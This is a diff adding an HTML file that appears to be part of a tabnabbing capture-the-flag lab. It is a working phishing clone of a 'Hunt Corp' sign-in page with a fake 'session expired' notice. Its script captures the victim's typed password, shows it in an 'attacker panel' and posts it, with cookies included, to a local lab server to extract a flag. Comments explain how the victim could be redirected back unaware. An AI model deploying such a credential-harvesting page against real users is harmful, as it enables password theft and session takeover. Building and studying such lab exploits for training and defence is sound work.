@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hunt Corp — Sign In</title>
+  <style>
+    /* ---- Mimics the victim app's login page ---- */
+    * { box-sizing: border-box; }
+    body {
+      background: #0f172a;
+      color: #e2e8f0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-card {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 12px;
+      padding: 36px 40px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .brand {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .brand-logo {
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      width: 52px;
+      height: 52px;
+      border-radius: 12px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.6rem;
+      margin-bottom: 12px;
+    }
+    .brand h1 {
+      margin: 0 0 4px;
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #f8fafc;
+    }
+    .brand p {
+      margin: 0;
+      font-size: 0.85rem;
+      color: #94a3b8;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 0.82rem;
+      color: #94a3b8;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+    .form-group input {
+      width: 100%;
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 6px;
+      color: #e2e8f0;
+      font-size: 0.95rem;
+      padding: 10px 12px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus {
+      border-color: #3b82f6;
+    }
+    .form-group input[readonly] {
+      color: #64748b;
+    }
+    .session-notice {
+      background: rgba(59,130,246,0.1);
+      border: 1px solid #3b82f6;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-size: 0.8rem;
+      color: #93c5fd;
+      margin-bottom: 16px;
+    }
+    .btn-login {
+      width: 100%;
+      background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      margin-top: 8px;
+    }
+    .btn-login:hover { opacity: 0.9; }
+    .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+    .footer-link {
+      text-align: center;
+      margin-top: 16px;
+      font-size: 0.8rem;
+      color: #64748b;
+    }
+    .footer-link a { color: #3b82f6; text-decoration: none; }
+
+    /* ---- Attacker results overlay (monospace, dark red) ---- */
+    #attacker-panel {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(13,17,23,0.92);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+    #attacker-panel.visible { display: flex; }
+    .attacker-results {
+      background: #0d1117;
+      border: 1px solid #f85149;
+      border-radius: 10px;
+      padding: 28px 32px;
+      max-width: 520px;
+      width: 100%;
+      font-family: 'Courier New', monospace;
+      color: #e6edf3;
+    }
+    .attacker-results h2 { color: #f85149; font-size: 1rem; margin: 0 0 16px; }
+    .attacker-results h3 { color: #58a6ff; font-size: 0.9rem; margin: 16px 0 8px; }
+    .terminal {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 14px;
+      white-space: pre-wrap;
+      font-size: 0.82rem;
+      min-height: 50px;
+    }
+    .flag-box {
+      background: rgba(63,185,80,0.08);
+      border: 1px solid #3fb950;
+      border-radius: 6px;
+      padding: 14px;
+      font-size: 1rem;
+      color: #3fb950;
+      margin-top: 12px;
+      word-break: break-all;
+    }
+    .success { color: #3fb950; }
+    .status  { color: #d29922; }
+    .error   { color: #f85149; }
+    .close-btn {
+      background: #21262d;
+      color: #e6edf3;
+      border: 1px solid #30363d;
+      border-radius: 4px;
+      padding: 8px 16px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      margin-top: 16px;
+    }
+    .close-btn:hover { background: #30363d; }
+    .attacker-badge {
+      display: inline-block;
+      font-size: 0.72rem;
+      padding: 2px 8px;
+      border-radius: 12px;
+      background: rgba(248,81,73,0.15);
+      border: 1px solid #f85149;
+      color: #f85149;
+      margin-bottom: 12px;
+    }
+    a.nav-link { color: #58a6ff; font-size: 0.8rem; }
+  </style>
+</head>
+<body>
+
+  <!-- ==================== PHISHING LOGIN PAGE ==================== -->
+  <div class="login-card">
+    <div class="brand">
+      <div class="brand-logo">H</div>
+      <h1>Hunt Corp</h1>
+      <p>Sign in to your account</p>
+    </div>
+
+    <div class="session-notice">
+      Your session expired. Please re-enter your password to continue.
+    </div>
+
+    <form id="phish-form" onsubmit="handleSubmit(event)">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" value="victim_user" readonly>
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" placeholder="Re-enter your password" id="pw" autocomplete="current-password" required>
+      </div>
+      <button type="submit" class="btn-login" id="submit-btn">Sign In</button>
+    </form>
+
+    <div class="footer-link">
+      <a href="#">Forgot password?</a> &nbsp;·&nbsp; <a href="#">Help</a>
+    </div>
+  </div>
+
+  <!-- ==================== ATTACKER RESULTS PANEL ==================== -->
+  <div id="attacker-panel">
+    <div class="attacker-results">
+      <span class="attacker-badge">ATTACKER PANEL</span>
+      <h2>[X4] Tabnabbing — Credential Capture Results</h2>
+
+      <h3>Captured Credentials</h3>
+      <div class="terminal" id="cred-display"><span class="status">Submitting to victim server...</span></div>
+
+      <h3>Server Response</h3>
+      <div class="terminal" id="response-display"><span class="status">Waiting...</span></div>
+
+      <div id="flag-container" style="display:none;">
+        <div class="flag-box" id="flag-display"></div>
+      </div>
+
+      <h3>What Happened</h3>
+      <div class="terminal" style="color:#7d8590;">1. Victim clicked a link without rel="noopener"
+2. Attacker page (x4.html) gained window.opener reference
+3. Opener tab was silently redirected to this phishing clone
+4. Victim re-entered credentials, believing this was the real app
+5. Credentials posted to victim server — response (including flag) captured here
+6. Victim may be forwarded back to the real site, unaware of the theft</div>
+
+      <button class="close-btn" onclick="document.getElementById('attacker-panel').classList.remove('visible')">Close Panel</button>
+      &nbsp;
+      <a href="index.html" class="nav-link">← Exploit Console</a>
+    </div>
+  </div>
+
+  <script>
+    async function handleSubmit(e) {
+      e.preventDefault();
+
+      const pw       = document.getElementById('pw').value;
+      const submitBtn= document.getElementById('submit-btn');
+      const credEl   = document.getElementById('cred-display');
+      const responseEl= document.getElementById('response-display');
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Signing in...';
+
+      // Show attacker panel immediately
+      document.getElementById('attacker-panel').classList.add('visible');
+      credEl.innerHTML = '';
+
+      const credLine = (msg, cls) => {
+        const s = document.createElement('span');
+        s.className = cls || '';
+        s.textContent = msg + '\n';
+        credEl.appendChild(s);
+      };
+
+      credLine('username: victim_user', 'success');
+      credLine('password: ' + pw, 'error');
+      credLine('');
+      credLine('[*] Forwarding credentials to victim server...', 'status');
+
+      try {
+        // POST the stolen credentials to the real victim endpoint.
+        // Because we include credentials: 'include', the victim's session cookie
+        // is sent too — potentially allowing full session takeover.
+        const res = await fetch('http://localhost:3000/api/x4/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'username=victim_user&password=' + encodeURIComponent(pw),
+          credentials: 'include'
+        });
+
+        const data = await res.json();
+
+        credLine('[+] Credentials accepted by victim server (HTTP ' + res.status + ')', 'success');
+
+        responseEl.textContent = JSON.stringify(data, null, 2);
+
+        // Extract flag
+        const raw = JSON.stringify(data);
+        const flagMatch = raw.match(/flag\{[^}]+\}/i);
+        if (data.flag || flagMatch) {
+          const flagValue = data.flag || (flagMatch && flagMatch[0]);
+          document.getElementById('flag-container').style.display = 'block';
+          document.getElementById('flag-display').textContent = 'FLAG CAPTURED: ' + flagValue;
+          credLine('[!!!] FLAG: ' + flagValue, 'success');
+        }
+
+        // In a real phishing attack the victim would be redirected back to the real site
+        // after a brief moment, making the credential theft invisible.
+        // setTimeout(() => { window.location = 'http://localhost:3000'; }, 2000);
+
+      } catch (err) {
+        credLine('[-] Error posting credentials: ' + err.message, 'error');
+        responseEl.innerHTML = '<span class="error">' + err.message + '</span>';
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Sign In';
+      }
+    }
+  </script>
+
+</body>
+</html>
